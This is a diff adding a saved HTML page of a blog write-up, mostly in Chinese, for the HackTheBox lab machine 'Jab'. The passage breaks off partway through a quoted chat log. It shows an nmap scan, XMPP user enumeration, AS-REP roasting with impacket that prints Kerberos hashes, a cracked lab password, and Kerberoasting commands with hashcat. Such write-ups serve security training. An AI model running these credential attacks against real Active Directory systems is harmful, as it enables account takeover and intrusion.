@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P JabNmap - tcp12345678910111213141516171819202122232425262728293031323334353637383940">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Jab">
+<meta property="og:url" content="https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P JabNmap - tcp12345678910111213141516171819202122232425262728293031323334353637383940">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226201823-38m4elo.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226192704-y8sgm95.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226201948-aipjwic.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226202152-3h4hwbm.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226212229-cr3jdqm.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226222142-8rgp9xo.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226222855-55mfhk0.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226231352-jx01d55.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226231441-0uprfps.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226231517-rvt1yzl.png">
+<meta property="article:published_time" content="2024-02-26T03:38:00.000Z">
+<meta property="article:modified_time" content="2024-07-15T18:51:57.846Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226201823-38m4elo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Jab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/04/2024-htb-machine/09-perfection/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/19/2024-htb-machine/07-office/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&text=HackTheBox - Machine - Jab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&is_video=false&description=HackTheBox - Machine - Jab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Jab&body=Check out this article: https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&title=HackTheBox - Machine - Jab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&name=HackTheBox - Machine - Jab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/02/26/2024-htb-machine/08-jab/&t=HackTheBox - Machine - Jab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.9rem;
+	   color: #00b4dd ;
+	}
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 .level-5 .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Jab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-26T03:38:00.000Z" class="dt-published" itemprop="datePublished">2024-02-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Jab"><a href="#Jab" class="headerlink" title="Jab"></a>Jab</h1><h2 id="Nmap-tcp"><a href="#Nmap-tcp" class="headerlink" title="Nmap - tcp"></a>Nmap - tcp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE             REASON          VERSION</span><br><span class="line"></span><br><span class="line">[DNS]</span><br><span class="line">53/tcp    open  domain              syn-ack ttl 127 Simple DNS Plus</span><br><span class="line"></span><br><span class="line">[KERBEROS]</span><br><span class="line">88/tcp    open  kerberos-sec        syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-02-26 10:54:38Z)</span><br><span class="line">464/tcp   open  kpasswd5?           syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">[WINRPC]</span><br><span class="line">135/tcp   open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn         syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?       syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line"></span><br><span class="line">[LDAP]</span><br><span class="line">389/tcp   open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)</span><br><span class="line">636/tcp   open  ssl/ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp  open  ldap                syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  ssl/ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.jab.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb</span><br><span class="line">| Issuer: commonName=jab-DC01-CA/domainComponent=jab</span><br><span class="line"></span><br><span class="line">[WINRM]</span><br><span class="line">5985/tcp  open  http                syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line"></span><br><span class="line">[jabber]</span><br><span class="line">5222/tcp  open  jabber              syn-ack ttl 127</span><br><span class="line">5223/tcp  open  ssl/jabber          syn-ack ttl 127</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.jab.htb</span><br><span class="line">| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb</span><br><span class="line">| Issuer: commonName=dc01.jab.htb</span><br><span class="line"></span><br><span class="line">5262/tcp  open  jabber              syn-ack ttl 127 Ignite Realtime Openfire Jabber server 3.10.0 or later</span><br><span class="line">5263/tcp  open  ssl/jabber          syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">5275/tcp  open  jabber              syn-ack ttl 127</span><br><span class="line">5276/tcp  open  ssl/jabber          syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">[XMPP]</span><br><span class="line">5269/tcp  open  xmpp                syn-ack ttl 127 Wildfire XMPP Client</span><br><span class="line">5270/tcp  open  ssl/xmpp            syn-ack ttl 127 Wildfire XMPP Client</span><br><span class="line"></span><br><span class="line">7070/tcp  open  realserver?         syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">7443/tcp  open  ssl/oracleas-https? syn-ack ttl 127</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.jab.htb</span><br><span class="line">| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb</span><br><span class="line">| Issuer: commonName=dc01.jab.htb</span><br><span class="line"></span><br><span class="line">7777/tcp  open  socks5              syn-ack ttl 127 (No authentication; connection failed)</span><br><span class="line">| socks-auth-info:</span><br><span class="line">|_  No authentication</span><br><span class="line"></span><br><span class="line">===================================================================================================================</span><br><span class="line">9389/tcp  open  mc-nmf              syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http                syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49686/tcp open  ncacn_http          syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49687/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49688/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49712/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49766/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">62646/tcp open  msrpc               syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="Login-into-XMPP-and-get-users-lists"><a href="#Login-into-XMPP-and-get-users-lists" class="headerlink" title="Login into XMPP and get users lists"></a>Login into XMPP and get users lists</h2><p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226201823-38m4elo.png" alt="image">​</p>
+<p>‍</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226192704-y8sgm95.png" alt="image">​</p>
+<p>然後點擊 <code>Help -&gt; Debug Window</code>​ 彈出debug窗口后，點擊搜索用戶，如下圖：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226201948-aipjwic.png" alt="image">​</p>
+<p>‍</p>
+<p>搜索 <code>*</code>​ 之後會有很多列表，保存debug的内容到一個文件，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226202152-3h4hwbm.png" alt="image">​</p>
+<p>使用 grep 抓一下裏面的用戶，到處一個列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -o -E <span class="string">&quot;[0-9a-zA-Z]&#123;0,&#125;@jab.htb&quot;</span> purple-debug.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> &gt; alluser.txt</span><br><span class="line"><span class="comment"># 弄一個user列表沒帶@後綴的</span></span><br><span class="line"><span class="built_in">cat</span> alluser.txt | <span class="built_in">cut</span> -d <span class="string">&#x27;@&#x27;</span> -f 1 &gt; user.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberos-pre-auth"><a href="#Kerberos-pre-auth" class="headerlink" title="Kerberos - pre auth"></a>Kerberos - pre auth</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-GetNPUsers -usersfile user.txt jab.htb/</span><br></pre></td></tr></table></figure>
+
+<p>看到有三個user是可以pre-auth，抓一下hash，使用hashcat 去爆破一下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-GetNPUsers -no-pass -request jab.htb/jmontgomery</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> jmontgomery</span><br><span class="line">$krb5asrep$23<span class="variable">$jmontgomery</span>@JAB.HTB:485cb3520a5702319f683b441fe9e921<span class="variable">$4260dbbc5e3fe51788d258fc0b40990f31a57e698eedac042fc6e87fb165d33d8be8f8da595a4312a839212177b3639ab8a2666b56b5ca3176abe7dcedcda7ed612ba4bda5f24468e0180fe06991b86177fc940738291d10d05333682f7869a76ecd0a9cf88c0c2321ba74f1742aff567532cd4183edad6fe2f96a4bad78f12e95145de58dcaab6638f820259213e3323165b123e8cf5ee0fa81be20f4d839dbdc09d5eea41bbb410545eaa09f8d4856ae3ca3852cd4cd5e733f8a7518cf34ec3bba5bde2aba9ad339d6a8ab677b8091ea4f1203bb4de8566d6dc8b3fa8619788db8</span></span><br><span class="line"></span><br><span class="line">$ impacket-GetNPUsers -no-pass -request jab.htb/lbradford</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> lbradford</span><br><span class="line">$krb5asrep$23<span class="variable">$lbradford</span>@JAB.HTB:61d60dd9c3671991d3df1e625b8597ad<span class="variable">$24aac4a931977606579fa32b184bbd25138aae6a30f3cab04a937128e31b1f3ec9c2524b4918cce5fa131176d47e8d4cba563929adfe513dfa7c13c36d202658b8897cefd26254ab13e2fe0ac8e478826ef173bde6ec7309605faf21a85c53368b8a8f453ae24cb2d11df17484cb5cef3d180fe1f9e0491a5b2fb9e4ed2769970a991a448518fcd3768e22e814b747c4d2490f0ba974e837e26ebc6e4bdd48cb432b7f59009a145ad77e5e2d1fb551e5c65d0ab9a5729dacc8511697f3fb0443a7135264b7c2c12263ea39d9db5ebe6298e8bbe64c501525beefa65c91cacb82bf3e</span></span><br><span class="line"></span><br><span class="line">$ impacket-GetNPUsers -no-pass -request jab.htb/mlowe</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> mlowe</span><br><span class="line">$krb5asrep$23<span class="variable">$mlowe</span>@JAB.HTB:f37aa777865509d9fab5945053a739a8<span class="variable">$79564e044b682c76a94779cdbf44984ac93c01f190951fe592f20a934e3d09069ee50b6a3059beb4acd5820d655953abb60a5f84b405b69323d22bdcf649359764d1c63ff202ebea552fae6d67c23df519286aab487fe2591320a09328c4d977e87d4d37010473d19989e5304764f34a097b2a202d0295ed4c3d402ecce8f3a9968bccc2078ef24fe702c6c4508a284da37688a04b0e06582bbc12e9c822acdd9b264a8763261774b7db5d58c5606806aaa76fa922a9be6d0785eb9559603baf6598ebfc5d8472a47bb53e3a9201d04cf78c1f28f664c0a9399e30c81a55ed8e2fb0</span></span><br></pre></td></tr></table></figure>
+
+<p>只有 <code>jmontgomery</code>​ 的用戶可以爆破，密碼是：<code>Midnight_121</code>​</p>
+<p>有了有效的賬號密碼之後，就可以用bloodhound 來畫一張地圖，看看可以做什麽。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/09-Jab-FDygvVIqCSmCjqJI/image-20240226212229-cr3jdqm.png" alt="image">​</p>
+<p>然後使用 <code>jmontgomery</code>​ 賬戶登錄 pidgin ，看到下面的對話内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">(11/22/23 02:31:13) adunn: team, we need to finalize post-remediation testing from last quarter&#x27;s pentest. @bdavis Brian can you please provide us with a status?</span><br><span class="line">(11/22/23 02:33:58) bdavis: sure. we removed the SPN from the svc_openfire account. I believe this was finding #2. can someone from the security team test this? if not we can send it back to the pentesters to validate. </span><br><span class="line">(11/22/23 03:30:41) bdavis: here are the commands from the report, can you find someone from the security team who can re-run these to validate? </span><br><span class="line">(11/22/23 03:30:43) bdavis: $ GetUserSPNs.py -request -dc-ip 192.168.195.129 jab.htb/hthompson</span><br><span class="line"> </span><br><span class="line">Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation</span><br><span class="line"> </span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName  Name          MemberOf  PasswordLastSet             LastLogon  Delegation </span><br><span class="line">--------------------  ------------  --------  --------------------------  ---------  ----------</span><br><span class="line">http/xmpp.jab.local   svc_openfire            2023-10-27 15:23:49.811611  &lt;never&gt;             </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$b1abbb2f4beb2a48e7412ccd26b60e61$864f27ddaaded607ab5efa59544870cece4b6262e20f3bee38408d296ffbf07ceb421188b9b82ac0037ae67b488bb0ef2178a0792d62&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">(11/22/23 03:30:56) bdavis: $ hashcat -m 13100 svc_openfire_tgs /usr/share/wordlists/rockyou.txt </span><br><span class="line"></span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span 